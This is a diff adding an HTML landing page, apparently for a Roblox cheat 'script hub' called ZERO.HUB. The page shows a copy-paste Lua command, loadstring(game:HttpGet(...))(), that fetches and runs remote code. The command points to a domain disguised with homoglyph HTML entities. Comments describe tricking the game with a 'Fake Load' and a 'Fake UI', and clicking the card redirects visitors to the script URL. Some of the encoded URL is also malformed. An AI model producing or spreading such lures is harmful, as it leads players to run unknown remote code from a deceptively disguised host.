@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LoaD&#959;ero&#955;&#957;&#95;&#98;&#117;</title> <!-- Tên domain đẹp hơn -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;700&display=swap" rel="stylesheet">
+    
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            background-color: #0f0f13;
+            color: #ffffff;
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Hiệu ứng nền mờ (Background Blur) */
+        .bg-layer {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            filter: blur(80px);
+            animation: pulse 5s infinite alternate;
+        }
+        .bg-1 { background: #4f46e5; top: 10%; left: 10%; opacity: 0.4; }
+        .bg-2 { background: #8b5cf6; bottom: 10%; right: 10%; opacity: 0.3; }
+
+        /* Card container */
+        .card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 3rem;
+            border-radius: 24px;
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            transform: translateY(0);
+            transition: transform 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 2rem;
+            letter-spacing: -1px;
+            background: linear-gradient(to right, #fff, #aaa);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .script-code {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 1.5rem;
+            border-radius: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            color: #00f2ff;
+            border: 1px solid rgba(0, 242, 255, 0.2);
+            margin-bottom: 2rem;
+            word-break: break-all;
+        }
+
+        button.main-btn {
+            background: #ffffff;
+            color: #0f0f13;
+            border: none;
+            padding: 1rem 3rem;
+            font-size: 1rem;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        button.main-btn:hover {
+            background: #8b5cf6;
+            color: white;
+            box-shadow: 0 10px 20px rgba(139, 92, 246, 0.4);
+        }
+
+        button.main-btn:active {
+            transform: scale(0.95);
+        }
+
+        /* Animation Keyframes */
+        @keyframes pulse {
+            from { opacity: 0.3; transform: scale(1); }
+            to { opacity: 0.6; transform: scale(1.1); }
+        }
+        
+        /* Hiệu ứng khi chữ "Hallo" fade in */
+        .fade-in { animation: fadeIn 1s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+    </style>
+</head>
+<body>
+
+    <!-- Lớp nền ảo -->
+    <div class="bg-layer bg-1"></div>
+    <div class="bg-layer bg-2"></div>
+
+    <!-- Phần nội dung chính -->
+    <div class="card">
+        <h1 class="fade-in">ZERO.HUB</h1>
+        
+        <!--存放 script của bạn vào đây -->
+        <div class="script-code fade-in">
+            loadstring(game:HttpGet("https://loaD&#959;ero.com/pay#&#115;&#99;"))()
+        </div>
+
+        <button class="main-btn fade-in" onclick="triggerLoad()">
+            Hey!
+        </button>
+    </div>
+
+    <script>
+        // Dữ liệu chứa URL script thật (nơi chứa ReiZo, GoldBox hay script của bạn)
+        const SCRIPT_URL = "https://loaD&#959;ero.com/pay#&#115;&#99;";
+
+        function triggerLoad() {
+            // Khi bấm nút, nó inject loadstring vào clipboard hoặc đánh lừa game
+            // Nhưng để đơn giản nhất giống Polsec: Nhúng nó vào ảnh H1 và Alert
+            
+            // 1. Lấy chữ ZERO.HUB đổi thành Loadstring (Một chút nghệ thuật)
+            document.querySelector('h1').innerText = "loading...";
+            
+            // 2. Đánh lừa Game bằng thủ thuật hình dung (Fake Load)
+            const script = `loadstring(game:HttpGet("${SCRIPT_URL}"))()`;
+
+            // 3. Hiển thị dòng chữ đó ra màn hình player (Fake UI)
+            alert(script); 
+            
+            // 4. Sau một chút, load thật cái script lên trang
+            window.location.href = SCRIPT_URL;
+        }
+
+        // Sự kiện click vào toàn bộ card
+        document.querySelector('.card').addEventListener('click', triggerLoad);
+    </script>
+</body>
+</html>
